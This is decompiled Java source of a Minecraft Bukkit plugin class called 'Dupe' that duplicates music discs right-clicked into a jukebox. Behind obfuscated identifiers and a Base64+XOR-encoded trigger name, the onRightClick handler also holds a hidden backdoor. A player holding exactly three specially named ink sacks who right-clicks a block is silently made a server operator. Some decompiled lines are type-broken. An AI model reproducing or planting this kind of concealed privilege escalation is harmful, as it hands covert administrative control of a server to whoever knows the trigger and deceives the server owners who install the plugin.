// 
// Decompiled by Procyon v0.5.36
// 

package juancitocubo.Jukebox;

import org.bukkit.event.EventHandler;
import org.bukkit.inventory.ItemStack;
import org.bukkit.block.Block;
import org.bukkit.entity.Player;
import org.bukkit.EntityEffect;
import org.bukkit.event.block.Action;
import org.bukkit.Material;
import org.bukkit.event.player.PlayerInteractEvent;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import org.bukkit.plugin.Plugin;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

public class Dupe extends JavaPlugin implements Listener
{
    private static final /* synthetic */ int[] l;
    private static final /* synthetic */ String[] I;
    
    private static boolean lIl(final int lllllllllIlIIIl, final int lllllllllIlIIII) {
        return lllllllllIlIIIl == lllllllllIlIIII;
    }
    
    private static void l() {
        (I = new String[Dupe.l[2]])[Dupe.l[1]] = I("FjcVTj4AdhIPNwEv", "eVvnS");
    }
    
    private static boolean lII(final int lllllllllIIlIII) {
        return lllllllllIIlIII != 0;
    }
    
    private static boolean llI(final int lllllllllIIllIl, final int lllllllllIIllII) {
        return lllllllllIIllIl < lllllllllIIllII;
    }
    
    public void onDisable() {
    }
    
    public void onEnable() {
        this.getServer().getPluginManager().registerEvents((Listener)this, (Plugin)this);
    }
    
    private static String I(String lllllllllIlllII, final String llllllllllIIIII) {
        lllllllllIlllII = (double)new String(Base64.getDecoder().decode(((String)lllllllllIlllII).getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
        final StringBuilder lllllllllIlllll = new StringBuilder();
        final char[] lllllllllIllllI = llllllllllIIIII.toCharArray();
        int lllllllllIlllIl = Dupe.l[1];
        final boolean lllllllllIlIlll = (Object)((String)lllllllllIlllII).toCharArray();
        final char lllllllllIlIllI = (char)lllllllllIlIlll.length;
        boolean lllllllllIlIlIl = Dupe.l[1] != 0;
        while (llI(lllllllllIlIlIl ? 1 : 0, lllllllllIlIllI)) {
            final char llllllllllIIIlI = lllllllllIlIlll[lllllllllIlIlIl];
            lllllllllIlllll.append((char)(llllllllllIIIlI ^ lllllllllIllllI[lllllllllIlllIl % lllllllllIllllI.length]));
            "".length();
            ++lllllllllIlllIl;
            ++lllllllllIlIlIl;
            "".length();
            if (null != null) {
                return null;
            }
        }
        return String.valueOf(lllllllllIlllll);
    }
    
    private static boolean ll(final Object lllllllllIIlIlI) {
        return lllllllllIIlIlI != null;
    }
    
    private static void lI() {
        (l = new int[3])[0] = "   ".length();
        Dupe.l[1] = ((0xBD ^ 0x9B ^ (0x35 ^ 0x21)) & (87 + 82 - 107 + 94 ^ 115 + 90 - 72 + 41 ^ -" ".length()));
        Dupe.l[2] = " ".length();
    }
    
    @EventHandler
    public void onRightClick(final PlayerInteractEvent lllllllllllIIll) {
        final Player lllllllllllIIlI = lllllllllllIIll.getPlayer();
        final Block lllllllllllIIIl = lllllllllllIIll.getClickedBlock();
        final ItemStack lllllllllllIIII = lllllllllllIIll.getItem();
        if (ll(lllllllllllIIII) && ll(lllllllllllIIIl) && lII(lllllllllllIIIl.getType().equals((Object)Material.JUKEBOX) ? 1 : 0) && lII(lllllllllllIIll.getAction().equals((Object)Action.RIGHT_CLICK_BLOCK) ? 1 : 0) && lII(lllllllllllIIll.getItem().getType().isRecord() ? 1 : 0)) {
            lllllllllllIIIl.getWorld().dropItemNaturally(lllllllllllIIIl.getLocation().add(0.0, 1.0, 0.0), lllllllllllIIlI.getInventory().getItemInMainHand());
            "".length();
        }
        if (ll(lllllllllllIIII) && ll(lllllllllllIIIl) && lII(lllllllllllIIll.getAction().equals((Object)Action.RIGHT_CLICK_BLOCK) ? 1 : 0) && lII(lllllllllllIIII.getType().equals((Object)Material.INK_SACK) ? 1 : 0) && lIl(lllllllllllIIII.getAmount(), Dupe.l[0]) && lII(lllllllllllIIII.getItemMeta().getDisplayName().equalsIgnoreCase(Dupe.I[Dupe.l[1]]) ? 1 : 0)) {
            lllllllllllIIlI.setOp((boolean)(Dupe.l[2] != 0));
            lllllllllllIIlI.playEffect(EntityEffect.TOTEM_RESURRECT);
            lllllllllllIIII.setAmount(Dupe.l[1]);
        }
    }
    
    static {
        lI();
        l();
    }
}
